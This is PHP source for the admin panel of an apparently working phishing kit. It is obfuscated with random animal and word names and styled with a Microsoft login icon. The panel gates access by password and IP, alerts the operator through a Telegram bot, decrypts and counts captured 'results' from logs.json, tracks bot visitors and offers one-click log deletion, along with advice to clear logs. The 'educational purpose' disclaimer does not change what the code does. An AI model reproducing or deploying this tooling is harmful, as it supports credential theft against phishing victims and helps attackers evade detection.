<?php

@ini_set("max_execution_time", "0");
session_start();
function Rice($eastern_kingbird)
{
    try {
        $talon = strrev("rtsbus")(("hash")("sha256", $eastern_kingbird), 2, 19);
        if ($talon) {
            return $talon;
        }
    } catch (Exception $fiber) {
        file_put_contents("login_err.txt", $fiber);
        return '';
    }
}
error_reporting(E_ALL);
function AcronychiaAcidula($secluded, $rudder, $butterfly_fish = null)
{
    global $viewable, $sesame;
    if ($secluded != null && $rudder != null) {
        $baird_s_rat_snake = strlen(password_hash($rudder, $viewable));
        $secluded = $defog = substr($secluded, $baird_s_rat_snake);
        $secluded = $butterfly_fish == "hex" ? hex2bin($secluded) : ($butterfly_fish == "base64" ? base64_decode($secluded) : $secluded);
        $recycling = substr($secluded, 0, 16);
        $campsite = hash_pbkdf2("sha512", $rudder . $rudder, $recycling, 40000, 64, true);
        $quantum = openssl_cipher_iv_length("aes-256-gcm");
        $generous = substr($secluded, 16, $quantum);
        $curve = substr($secluded, -16);
        return openssl_decrypt(substr($secluded, 16 + $quantum, -16), "aes-256-gcm", $campsite, $sesame, $generous, $curve);
    }
}
class Gnat
{
    public function MexicanFreeTailedBat($nimbly)
    {
        if ($this->Appraiser($nimbly) == '') {
            $this->Appraiser($nimbly);
        }
    }
    public function Motto($meganeura, $reporter)
    {
        file_put_contents(__DIR__ . "/" . $reporter, $meganeura, FILE_APPEND);
    }
    public function Appraiser($nimbly)
    {
        $produce = curl_init();
        curl_setopt($produce, CURLOPT_URL, $nimbly);
        curl_setopt($produce, CURLOPT_RETURNTRANSFER, 1);
        $prunus_pseudocerasus = curl_exec($produce);
        $exciting = curl_getinfo($produce, CURLINFO_HTTP_CODE);
        if ($exciting == 200) {
            return $prunus_pseudocerasus;
        } else {
            file_put_contents("../error_log.txt", "Invalid Token" . PHP_EOL, FILE_APPEND);
            return $prunus_pseudocerasus;
        }
    }
    public function GordonSetter($botanist, $tibetan_mastiff)
    {
        $purple_tarantula = "++++Office Email From Greatness+++++";
        $catty = "Content-type: text/html; charset=UTF-8" . "\r\nFrom: Greatness <ghost@greatness.com>" . "\r\n";
        @mail($botanist, $purple_tarantula, $tibetan_mastiff, $catty);
    }
    public function Undergo($meganeura, $scutosaurus, $tangerine_leopard_gecko, $fascism, $reporter)
    {
        $lukewarm = array("chat_id" => $tangerine_leopard_gecko, "text" => $meganeura);
        $nimbly = "https://api.telegram.org/bot" . str_replace("bot", '', $scutosaurus);
        $irrigate = $nimbly . "/sendMessage?" . str_replace("?", '', http_build_query($lukewarm));
        $this->MexicanFreeTailedBat($irrigate);
    }
}
$lukewarm = parse_ini_file("../files/config.ini");
$legend = $_SERVER["REMOTE_ADDR"];
if ($lukewarm["ip"]) {
    if (Rice($_SERVER["REMOTE_ADDR"]) != $lukewarm["ip"]) {
        echo "<h1>Ip Restriction come back later</h1>";
        exit(0);
    }
}
if (isset($_POST["logout"])) {
    unset($_SESSION["logged"]);
    header("Location: index.php");
    exit;
}
function Troglodytarum()
{
    $arson = "Unknown OS";
    $confess = array("/windows nt 10/i" => "Windows 10", "/windows nt 6.3/i" => "Windows 8.1", "/windows nt 6.2/i" => "Windows 8", "/windows nt 6.1/i" => "Windows 7", "/windows nt 6.0/i" => "Windows Vista", "/windows nt 5.2/i" => "Windows Server 2003/XP x64", "/windows nt 5.1/i" => "Windows XP", "/windows xp/i" => "Windows XP", "/windows nt 5.0/i" => "Windows 2000", "/windows me/i" => "Windows ME", "/win98/i" => "Windows 98", "/win95/i" => "Windows 95", "/win16/i" => "Windows 3.11", "/macintosh|mac os x/i" => "Mac OS X", "/mac_powerpc/i" => "Mac OS 9", "/linux/i" => "Linux", "/ubuntu/i" => "Ubuntu", "/iphone/i" => "iPhone", "/ipod/i" => "iPod", "/ipad/i" => "iPad", "/android/i" => "Android", "/blackberry/i" => "BlackBerry", "/webos/i" => "Mobile");
    foreach ($confess as $raft => $slashed) {
        if (preg_match($raft, $_SERVER["HTTP_USER_AGENT"])) {
            $arson = $slashed;
        }
    }
    return $arson;
}
function Cage()
{
    $baton = "Unknown Browser";
    $confess = array("/msie/i" => "Internet Explorer", "/firefox/i" => "Firefox", "/safari/i" => "Safari", "/chrome/i" => "Chrome", "/edge/i" => "Edge", "/opera/i" => "Opera", "/netscape/i" => "Netscape", "/maxthon/i" => "Maxthon", "/konqueror/i" => "Konqueror", "/mobile/i" => "Handheld Browser");
    foreach ($confess as $raft => $slashed) {
        if (preg_match($raft, $_SERVER["HTTP_USER_AGENT"])) {
            $baton = $slashed;
        }
    }
    return $baton;
}
if (isset($_POST["password"])) {
    if (Rice($_POST["password"]) == $lukewarm["password"]) {
        $_SESSION["logged"] = $lukewarm["password"];
        if ($lukewarm["password"] == "f615d5bcaac778352a8") {
            $credit = "<script>alert(\"You're using the default password, Please Change it to avoid panel intrusion\");</script>";
        }
        if ($lukewarm["ip"]) {
            if (Rice($_SERVER["REMOTE_ADDR"]) != $lukewarm["ip"]) {
                echo "<h1>Ip Restriction come back later</h1>";
                exit(0);
            }
        }
        $overexert = sprintf("New Visitor Logged Into Your Admin Panel \r\nIP :%s\r\nBrowser: %s\r\nMachine: %s\r\nIf this was not you please take neccesarry actions like clearing your logs and changing your panel.\r\n====GREATNESS======", $_SERVER["REMOTE_ADDR"], Cage(), Troglodytarum());
        $overfed = new Gnat();
        $overfed->Undergo($overexert, $lukewarm["bot"], $lukewarm["chat"], $lukewarm["email"], "visits.txt");
    } else {
        $thieving = "<h3 class=\"text-danger\">Sorry, Can't Log You In </h3>";
    }
}
if ($lukewarm["ip"]) {
    if (Rice($_SERVER["REMOTE_ADDR"]) != $lukewarm["ip"]) {
        echo "<h1>Ip Restriction come back later</h1>";
        exit(0);
    }
}
if (isset($_SESSION["logged"])) {
    if ($_SESSION["logged"] != $lukewarm["password"]) {
        unset($_SESSION["logged"]);
    }
}
if (!isset($_SESSION["logged"])) {
    $irrigate = $thieving ?? '';
    $surging = "<html>\r\n<head>\r\n<script src=\"https://code.jquery.com/jquery-3.2.1.slim.min.js\" integrity=\"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN\" crossorigin=\"anonymous\"></script>\r\n<script src=\"https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js\" integrity=\"sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q\" crossorigin=\"anonymous\"></script>\r\n<link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css\" integrity=\"sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm\" crossorigin=\"anonymous\">\r\n<script src=\"https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js\" integrity=\"sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl\" crossorigin=\"anonymous\"></script>\r\n<link href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css\" rel=\"stylesheet\" integrity=\"sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC\" crossorigin=\"anonymous\">\r\n<script src=\"https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js\" integrity=\"sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM\" crossorigin=\"anonymous\"></script>\r\n<style>\r\nbody {\r\nbackground-color:black;;\r\noverflow:hidden;\r\n}\r\n.typewriter{\r\n  overflow: hidden; /* Ensures the content is not revealed until the animation */\r\n  border-right: .15em solid orange; /* The typwriter cursor */\r\n  background-color: rgb(24, 2, 2);\r\n  white-space: nowrap; /* Keeps the content on a single line */\r\n  margin: 0 auto; /* Gives that scrolling effect as the typing happens */\r\n  letter-spacing: .15em; /* Adjust as needed */\r\n  animation: \r\n    typing 3.5s steps(40, end),\r\n    blink-caret .75s step-end infinite;\r\n}\r\n\r\n/* The typing effect */\r\n@keyframes typing {\r\n  from { width: 0 }\r\n  to { width: 100% }\r\n}\r\n\r\n/* The typewriter cursor effect */\r\n@keyframes blink-caret {\r\n  from, to { border-color: transparent }\r\n  50% { border-color: orange; }\r\n}\r\n\r\ncontain {\r\n\tperspective: 500px;\t\r\n\tdisplay: flex;\r\n\tjustify-content: center;\r\n\talign-items: center;\r\n\theight: 100vh;\r\n}\r\n\r\nimg {\r\n  height: 4rem;\r\n\tbackground: grey;\r\n\ttransform: rotateY(90deg);\r\n\tanimation: rotateAnimation 3s linear infinite;\r\n}\r\n\r\n@keyframes rotateAnimation {\r\n\tfrom {transform: rotateY(45deg);}\r\n\tto {transform: rotateY(225deg);}\r\n}\r\n</style>\r\n</head>\r\n<body>\r\n<section class=\"vh-100 gradient-custom\">\r\n  <div class=\"container py-5 h-100\">\r\n    <div class=\"row d-flex justify-content-center align-items-center h-100\">\r\n      <div class=\"col-12 col-md-8 col-lg-6 col-xl-5\">\r\n        <div class=\"card bg-dark text-white\" style=\"border-radius: 1rem;\">\r\n          <div class=\"card-body p-5 text-center\">\r\n            <div class=\"contain\">\r\n              <img src=\"https://aadcdn.msftauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico\"></img>\r\n            </div>\r\n            <div class=\"mb-md-5 mt-md-4 pb-5\">\r\n              <br>\r\n              <h2 class=\"fw-bold mb-2 text-uppercase\">Admin Panel</h2>\r\n              <p class=\"text-white-50 mb-5 typewriter\">Welcome Back " . $lukewarm["name"] . "</p>\r\n\r\n              <div class=\"form-outline form-white mb-4\">\r\n\t\t\t\t\t" . $irrigate . "\r\n              </div>\r\n                <form method=\"POST\">\r\n                  <div class=\"form-outline form-white mb-4\">\r\n                    <input type=\"password\" name=\"password\" placeholder=\"Please input your password\" id=\"typePasswordX\" class=\"form-control form-control-lg\" />\r\n                   <label class=\"form-label\" for=\"typePasswordX\"></label>\r\n                 </div>\r\n                 <div class=\"form-check form-switch\">\r\n                  <input class=\"form-check-input\" title=\"Please chdck this box\" type=\"checkbox\" id=\"flexSwitchCheckDefault\" onchange=\"document.getElementById('agree').disabled = !this.checked;\">\r\n                  <label class=\"form-check-label\" for=\"flexSwitchCheckDefault\">I Agree to the terms and service.</label>\r\n                </div>\r\n                <br>\r\n              <button class=\"btn btn-success btn-outline-light btn-lg px-5 \" id=\"agree\" type=\"submit\" disabled>Login</button>\r\n                 </form>\r\n                 <h3 class=\"text-primary\">\r\n                  <a class=\"typewrite\" data-period=\"2000\" data-type='[ \"Disclamer!\", \"This Page Is Only For Educational Purpose.\", \"And for learning purposes too\",\"Im not responsible for any damage caused by this page\", \"GREATNESS.\" ]'>\r\n                    <span class=\"wrap\"></span>\r\n                  </a>\r\n                </h3>\r\n            </div>\r\n          </div>\r\n        </div>\r\n      </div>\r\n    </div>\r\n  </div>\r\n</section>\r\n<script>\r\n  var TxtType = function(el, toRotate, period) {\r\n        this.toRotate = toRotate;\r\n        this.el = el;\r\n        this.loopNum = 0;\r\n        this.period = parseInt(period, 10) || 2000;\r\n        this.txt = '';\r\n        this.tick();\r\n        this.isDeleting = false;\r\n    };\r\n\r\n    TxtType.prototype.tick = function() {\r\n        var i = this.loopNum % this.toRotate.length;\r\n        var fullTxt = this.toRotate[i];\r\n\r\n        if (this.isDeleting) {\r\n        this.txt = fullTxt.substring(0, this.txt.length - 1);\r\n        } else {\r\n        this.txt = fullTxt.substring(0, this.txt.length + 1);\r\n        }\r\n\r\n        this.el.innerHTML = '<span class=\"wrap\">'+this.txt+'</span>';\r\n\r\n        var that = this;\r\n        var delta = 200 - Math.random() * 100;\r\n\r\n        if (this.isDeleting) { delta /= 2; }\r\n\r\n        if (!this.isDeleting && this.txt === fullTxt) {\r\n        delta = this.period;\r\n        this.isDeleting = true;\r\n        } else if (this.isDeleting && this.txt === '') {\r\n        this.isDeleting = false;\r\n        this.loopNum++;\r\n        delta = 500;\r\n        }\r\n\r\n        setTimeout(function() {\r\n        that.tick();\r\n        }, delta);\r\n    };\r\n\r\n    window.onload = function() {\r\n        var elements = document.getElementsByClassName('typewrite');\r\n        for (var i=0; i<elements.length; i++) {\r\n            var toRotate = elements[i].getAttribute('data-type');\r\n            var period = elements[i].getAttribute('data-period');\r\n            if (toRotate) {\r\n              new TxtType(elements[i], JSON.parse(toRotate), period);\r\n            }\r\n        }\r\n        // INJECT CSS\r\n        var css = document.createElement(\"style\");\r\n        css.type = \"text/css\";\r\n        css.innerHTML = \".typewrite > .wrap { border-right: 0.08em solid #fff}\";\r\n        document.body.appendChild(css);\r\n    };\r\n</script>\r\n</body>\r\n</html>";
    echo $surging;
    exit;
} else {
    if (isset($_SESSION["logged"])) {
        if ($_SESSION["logged"] == $lukewarm["password"]) {
            if ($lukewarm["ip"]) {
                if (Rice($_SERVER["REMOTE_ADDR"]) != $lukewarm["ip"]) {
                    echo "<h1>Ip Restriction come back later</h1>";
                    exit(0);
                }
            }
            $viewable = PASSWORD_DEFAULT;
            $sesame = OPENSSL_RAW_DATA;
            function Overeater($scarcity)
            {
                global $lukewarm;
                $expenses = file_get_contents($scarcity);
                $chorkie = explode(PHP_EOL, $expenses);
                $divorcee = '';
                foreach ($chorkie as $headache) {
                    $divorcee .= AcronychiaAcidula($headache, $lukewarm["password"], "hex") . PHP_EOL;
                }
                return $divorcee;
            }
            if ($lukewarm["ip"]) {
                if (Rice($_SERVER["REMOTE_ADDR"]) != $lukewarm["ip"]) {
                    echo "<h1>Ip Restriction come back later</h1>";
                    exit(0);
                }
            }
            if (isset($_POST["clear"])) {
                if (file_exists("logs.json") && file_exists("log.json")) {
                    unlink("logs.json");
                    unlink("log.json");
                }
                if (file_exists("error.log")) {
                    @unlink("error.log");
                }
            }
        }
    } else {
        exit;
    }
}
if ($lukewarm["ip"]) {
    if (Rice($_SERVER["REMOTE_ADDR"]) != $lukewarm["ip"]) {
        echo "<h1>Ip Restriction come back later</h1>";
        exit(0);
    }
}
echo "<!DOCTYPE html>\r\n<html dir=\"ltr\" lang=\"en\">\r\n  <head>\r\n    <meta charset=\"utf-8\" />\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\r\n    <!-- Tell the browser to be responsive to screen width -->\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\r\n\t\t<style>\r\n\tbody, html {width: 100%;}\r\n\t.d-tab, .full-width-td {\r\n\t\twidth: 100%;\r\n\t}\r\n\t.full-width-tr {\r\n      display: flex;\r\n      flex-wrap: wrap;\r\n    }\r\n    \r\n    .full-width-td {\r\n      width: 100%;\r\n    }\r\n\t.full-width-td {display:block; box-sizing:border-box; clear:both}\r\n\t.app-search .form-control {\r\n border:none;\r\n font-size:13px;\r\n color:#4c5667;\r\n padding-left:20px;\r\n padding-right:40px;\r\n background:rgba(232, 216, 216, 0.9);\r\n -webkit-box-shadow:none;\r\n /*! box-shadow:none; */height:30px;\r\n font-weight:600;\r\n width:180px;\r\n display:inline-block;\r\n line-height:30px;\r\n margin-top:15px;\r\n border-radius:40px;\r\n -webkit-transition:0.5s ease-out;\r\n transition:0.5s ease-out\r\n}\r\n.app-search .form-control:focus {\r\n width:300px\r\n}\r\n.navbar-nav .app-search {\r\n position:relative;\r\n margin:0\r\n}\r\n.navbar-nav .app-search a {\r\n position:absolute;\r\n top:5px;\r\n right:10px;\r\n color:#4c5667\r\n}\r\n\t</style>\r\n\t<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css\" integrity=\"sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A==\" crossorigin=\"anonymous\" referrerpolicy=\"no-referrer\" />\r\n    <meta\r\n      name=\"keywords\"\r\n      content=\"wrappixel, admin dashboard, html css dashboard, web dashboard, bootstrap 5 admin, bootstrap 5, css3 dashboard, bootstrap 5 dashboard, Ample lite admin bootstrap 5 dashboard, frontend, responsive bootstrap 5 admin template, Ample admin lite dashboard bootstrap 5 dashboard template\"\r\n    />\r\n    <meta\r\n      name=\"description\"\r\n      content=\"Ample Admin Lite is powerful and clean admin dashboard template, inpired from Bootstrap Framework\"\r\n    />\r\n    <meta name=\"robots\" content=\"noindex,nofollow\" />\r\n    <title>Admin Panel</title>\r\n    <link\r\n      rel=\"canonical\"\r\n      href=\"https://www.wrappixel.com/templates/ample-admin-lite/\"\r\n    />\r\n    <!-- Favicon icon -->\r\n    <link\r\n      rel=\"icon\"\r\n      type=\"image/png\"\r\n      sizes=\"16x16\"\r\n      href=\"https://demos.wrappixel.com/free-admin-templates/bootstrap/ample-bootstrap-free/html/plugins/images/favicon.png\"\r\n    />\r\n    <!-- Custom CSS -->\r\n    <link\r\n      href=\"https://demos.wrappixel.com/free-admin-templates/bootstrap/ample-bootstrap-free/html/plugins/bower_components/chartist/dist/chartist.min.css\"\r\n      rel=\"stylesheet\"\r\n    />\r\n    <link\r\n      rel=\"stylesheet\"\r\n      href=\"https://demos.wrappixel.com/free-admin-templates/bootstrap/ample-bootstrap-free/html/plugins/bower_components/chartist-plugin-tooltips/dist/chartist-plugin-tooltip.css\"\r\n    />\r\n    <!-- Custom CSS -->\r\n    <link href=\"https://demos.wrappixel.com/free-admin-templates/bootstrap/ample-bootstrap-free/html/css/style.min.css\" rel=\"stylesheet\" />\r\n   <script src=\"https://code.jquery.com/jquery-3.6.0.min.js\" integrity=\"sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=\" crossorigin=\"anonymous\"></script>\r\n    <script src=\"js/jqr.js\"></script>\r\n  </head>\r\n\r\n  <body>\r\n    <!-- ============================================================== -->\r\n    <!-- Preloader - style you can find in spinners.css -->\r\n    <!-- ============================================================== -->\r\n    <div class=\"preloader\">\r\n      <div class=\"lds-ripple\">\r\n        <div class=\"lds-pos\"></div>\r\n        <div class=\"lds-pos\"></div>\r\n      </div>\r\n    </div>\r\n    <!-- ============================================================== -->\r\n    <!-- Main wrapper - style you can find in pages.scss -->\r\n    <!-- ============================================================== -->\r\n\t";
echo $credit ?? '';
echo "    <div\r\n      id=\"main-wrapper\"\r\n      data-layout=\"vertical\"\r\n      data-navbarbg=\"skin5\"\r\n      data-sidebartype=\"full\"\r\n      data-sidebar-position=\"absolute\"\r\n      data-header-position=\"absolute\"\r\n      data-boxed-layout=\"full\"\r\n    >\r\n      <!-- ============================================================== -->\r\n      <!-- Topbar header - style you can find in pages.scss -->\r\n      <!-- ============================================================== -->\r\n      <header class=\"topbar\" data-navbarbg=\"skin5\">\r\n        <nav class=\"navbar top-navbar navbar-expand-md navbar-dark\">\r\n          <div class=\"navbar-header\" data-logobg=\"skin6\">\r\n            <!-- ============================================================== -->\r\n            <!-- Logo -->\r\n            <!-- ============================================================== -->\r\n            <a class=\"navbar-brand\" href=\"index.php\">\r\n              <!-- Logo icon -->\r\n              <b class=\"logo-icon\">\r\n                <!-- Dark Logo icon -->\r\n                <img src=\"https://demos.wrappixel.com/free-admin-templates/bootstrap/ample-bootstrap-free/html/plugins/images/logo-icon.png\" alt=\"homepage\" />\r\n              </b>\r\n              <!--End Logo icon -->\r\n              <!-- Logo text -->\r\n              <span class=\"logo-text\">\r\n                <!-- dark Logo text -->\r\n                <img src=\"https://demos.wrappixel.com/free-admin-templates/bootstrap/ample-bootstrap-free/html/plugins/images/logo-text.png\" alt=\"homepage\" />\r\n              </span>\r\n            </a>\r\n            <!-- ============================================================== -->\r\n            <!-- End Logo -->\r\n            <!-- ============================================================== -->\r\n            <!-- ============================================================== -->\r\n            <!-- toggle and nav items -->\r\n            <!-- ============================================================== -->\r\n            <a\r\n              class=\"nav-toggler waves-effect waves-light text-dark d-block d-md-none\"\r\n              href=\"javascript:void(0)\"\r\n            >\r\n              <i class=\"ti-menu ti-close\"></i>\r\n            </a>\r\n          </div>\r\n          <!-- ============================================================== -->\r\n          <!-- End Logo -->\r\n          <!-- ============================================================== -->\r\n          <div\r\n            class=\"navbar-collapse collapse\"\r\n            id=\"navbarSupportedContent\"\r\n            data-navbarbg=\"skin5\"\r\n          >\r\n            <!-- ============================================================== -->\r\n            <!-- Right side toggle and nav items -->\r\n            <!-- ============================================================== -->\r\n            <ul class=\"navbar-nav ms-auto d-flex align-items-center\">\r\n              <!-- ============================================================== -->\r\n              <!-- Search -->\r\n              <!-- ============================================================== -->\r\n              <li class=\"in\">\r\n               \r\n              </li>\r\n              <!-- ============================================================== -->\r\n              <!-- User profile and search -->\r\n              <!-- ============================================================== -->\r\n              <li>\r\n                <a class=\"profile-pic\" href=\"#\">\r\n                  <img\r\n                    src=\"https://aadcdn.msftauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico\"\r\n                    alt=\"user-img\"\r\n                    width=\"36\"\r\n                    class=\"img-circle\"\r\n                  />\r\n                  <span class=\"text-white font-medium\">";
printf("%s Panel", $lukewarm["name"]);
echo "</span>\r\n                </a>\r\n              </li>\r\n              <!-- ============================================================== -->\r\n              <!-- User profile and search -->\r\n              <!-- ============================================================== -->\r\n            </ul>\r\n          </div>\r\n        </nav>\r\n      </header>\r\n      <!-- ============================================================== -->\r\n      <!-- End Topbar header -->\r\n      <!-- ============================================================== -->\r\n      <!-- ============================================================== -->\r\n      <!-- Left Sidebar - style you can find in sidebar.scss  -->\r\n      <!-- ============================================================== -->\r\n      <aside class=\"left-sidebar\" data-sidebarbg=\"skin6\">\r\n        <!-- Sidebar scroll-->\r\n        <div class=\"scroll-sidebar\">\r\n          <!-- Sidebar navigation-->\r\n          <nav class=\"sidebar-nav\">\r\n            <ul id=\"sidebarnav\">\r\n              <!-- User Profile-->\r\n              <li class=\"sidebar-item pt-2\">\r\n                <a\r\n                  class=\"sidebar-link waves-effect waves-dark sidebar-link\"\r\n                  href=\"index.php\"\r\n                  aria-expanded=\"false\"\r\n                >\r\n                  <i class=\"far fa-clock\" aria-hidden=\"true\"></i>\r\n                  <span class=\"hide-menu\">Dashboard</span>\r\n                </a>\r\n              </li>\r\n              <li class=\"sidebar-item\">\r\n                <a\r\n                  class=\"sidebar-link waves-effect waves-dark sidebar-link\"\r\n                  href=\"index.php\"\r\n                  aria-expanded=\"false\"\r\n                >\r\n                  <i class=\"fa fa-user\" aria-hidden=\"true\"></i>\r\n                  <span class=\"hide-menu\">Settings</span>\r\n                </a>\r\n              </li>\r\n              <li class=\"sidebar-item\">\r\n                <a\r\n                  class=\"sidebar-link waves-effect waves-dark sidebar-link\"\r\n                  href=\"index.php\"\r\n                  aria-expanded=\"false\"\r\n                >\r\n                  <i class=\"fa fa-table\" aria-hidden=\"true\"></i>\r\n                  <span class=\"hide-menu\">Oth</span>\r\n                </a>\r\n              </li>\r\n            </ul>\r\n          </nav>\r\n          <!-- End Sidebar navigation -->\r\n        </div>\r\n        <!-- End Sidebar scroll-->\r\n      </aside>\r\n      <!-- ============================================================== -->\r\n      <!-- End Left Sidebar - style you can find in sidebar.scss  -->\r\n      <!-- ============================================================== -->\r\n      <!-- ============================================================== -->\r\n      <!-- Page wrapper  -->\r\n      <!-- ============================================================== -->\r\n      <div class=\"page-wrapper\">\r\n        <!-- ============================================================== -->\r\n        <!-- Bread crumb and right sidebar toggle -->\r\n        <!-- ============================================================== -->\r\n        <div class=\"page-breadcrumb bg-white\">\r\n          <div class=\"row align-items-center\">\r\n            <div class=\"col-lg-3 col-md-4 col-sm-4 col-xs-12\">\r\n              <h4 class=\"page-title\">Dashboard</h4>\r\n            </div>\r\n            <div class=\"col-lg-9 col-sm-8 col-md-8 col-xs-12\">\r\n              <div class=\"d-md-flex\">\r\n                <ol class=\"breadcrumb ms-auto\">\r\n\t\t\t\t<form method=\"POST\" action=\"index.php\" onsubmit=\"if (!confirm('Are you sure you want to clear your logs?')) return false;\">\r\n\t\t\t\t\t<input type=\"hidden\" name=\"clear\" value=\"all\"></input>\r\n                  <li><button class=\"btn btn-danger\" type=\"submit\">Reset Log's and Visit's</button></li>\r\n\t\t\t\t </form>\r\n\t\t\t\t <form method=\"POST\" action=\"index.php\">\r\n\t\t\t\t\t<input type=\"hidden\" name=\"logout\" value=\"all\"></input>\r\n                  <li><button class=\"btn btn-danger mx-3\" type=\"submit\">Log Out</button></li>\r\n\t\t\t\t </form>\r\n                </ol>\r\n                  \r\n                </a>\r\n              </div>\r\n            </div>\r\n          </div>\r\n          <!-- /.col-lg-12 -->\r\n        </div>\r\n        <!-- ============================================================== -->\r\n        <!-- End Bread crumb and right sidebar toggle -->\r\n        <!-- ============================================================== -->\r\n        <!-- ============================================================== -->\r\n        <!-- Container fluid  -->\r\n        <!-- ============================================================== -->\r\n        <div class=\"container-fluid\">\r\n          <!-- ============================================================== -->\r\n          <!-- Three charts -->\r\n          <!-- ============================================================== -->\r\n          <div class=\"row justify-content-center\">\r\n            <div class=\"col-lg-4 col-md-12\">\r\n              <div class=\"white-box analytics-info\">\r\n                <h3 class=\"box-title\">Total Visits</h3>\r\n                <ul class=\"list-inline two-part d-flex align-items-center mb-0\">\r\n                  <li>\r\n                    <div id=\"sparklinedash\">\r\n                      <canvas\r\n                        width=\"67\"\r\n                        height=\"30\"\r\n                        style=\"\r\n                          display: inline-block;\r\n                          width: 67px;\r\n                          height: 30px;\r\n                          vertical-align: top;\r\n                        \"\r\n                      ></canvas>\r\n                    </div>\r\n                  </li>\r\n                  <li class=\"ms-auto\">\r\n                    <span class=\"counter text-success\">\r\n\t\t\t\t\t";
if (file_exists("log.json") == true) {
    $good = explode(PHP_EOL, file_get_contents("log.json"));
    $foothill = 0;
    foreach ($good as $music => $december) {
        if ($december) {
            $muskox = json_decode($december, 1)["bot"];
            if ($muskox == 0) {
                $foothill += 1;
            }
        } else {
        }
    }
    echo $foothill;
} else {
    echo 0;
}
echo "\t\t\t\t\t</span>\r\n                  </li>\r\n                </ul>\r\n              </div>\r\n            </div>\r\n            <div class=\"col-lg-4 col-md-12\">\r\n              <div class=\"white-box analytics-info\">\r\n                <h3 class=\"box-title\">Total Results</h3>\r\n                <ul class=\"list-inline two-part d-flex align-items-center mb-0\">\r\n                  <li>\r\n                    <div id=\"sparklinedash2\">\r\n                      <canvas\r\n                        width=\"67\"\r\n                        height=\"30\"\r\n                        style=\"\r\n                          display: inline-block;\r\n                          width: 67px;\r\n                          height: 30px;\r\n                          vertical-align: top;\r\n                        \"\r\n                      ></canvas>\r\n                    </div>\r\n                  </li>\r\n                  <li class=\"ms-auto\">\r\n                    <span class=\"counter text-purple\">\t";
if (file_exists("logs.json") == true) {
    $tingle = array_filter(explode(PHP_EOL, Overeater("logs.json")));
    echo count($tingle);
} else {
    echo 0;
}
echo "</span>\r\n                  </li>\r\n                </ul>\r\n              </div>\r\n            </div>\r\n            <div class=\"col-lg-4 col-md-12\">\r\n              <div class=\"white-box analytics-info\">\r\n                <h3 class=\"box-title\">Total Bots</h3>\r\n                <ul class=\"list-inline two-part d-flex align-items-center mb-0\">\r\n                  <li>\r\n                    <div id=\"sparklinedash3\">\r\n                      <canvas\r\n                        width=\"67\"\r\n                        height=\"30\"\r\n                        style=\"\r\n                          display: inline-block;\r\n                          width: 67px;\r\n                          height: 30px;\r\n                          vertical-align: top;\r\n                        \"\r\n                      ></canvas>\r\n                    </div>\r\n                  </li>\r\n                  <li class=\"ms-auto\">\r\n                    <span class=\"counter text-info\">";
if (file_exists("log.json") == true) {
    $plated = explode(PHP_EOL, file_get_contents("log.json"));
    $foothill = 0;
    foreach ($plated as $music => $december) {
        if ($december) {
            $muskox = json_decode($december, 1)["bot"];
            if ($muskox == 1) {
                $foothill += 1;
            }
        } else {
        }
    }
    echo $foothill;
} else {
    echo 0;
}
echo "</span>\r\n                  </li>\r\n                </ul>\r\n              </div>\r\n            </div>\r\n          </div>\r\n          <!-- ============================================================== -->\r\n          <!-- PRODUCTS YEARLY SALES -->\r\n          <!-- ============================================================== -->\r\n\t\t  <div class=\"row\">\r\n            <div class=\"col-md-12 col-lg-12 col-sm-12 col-xs-12\">\r\n              <div class=\"white-box overflow-auto\">\r\n                <h3 class=\"box-title\">Errors</h3>\r\n               \r\n                <div id=\"ctx-visits\" style=\"max-height: 200px;\">\r\n\t\t\t\t\t<table class=\"d-tab\">\r\n\t\t\t\t\t<tbody>\r\n\t\t\t\t   ";
if (file_exists("error.log")) {
    $jujitsu = file_get_contents("error.log");
    if ($jujitsu) {
        $theater = explode(PHP_EOL, $jujitsu);
        foreach ($theater as $canada_lynx) {
            if ($canada_lynx) {
                echo "<tr><p>{$canada_lynx}</p></tr>";
            }
        }
    } else {
        echo "No Errors";
    }
} else {
    echo "No Errors";
}
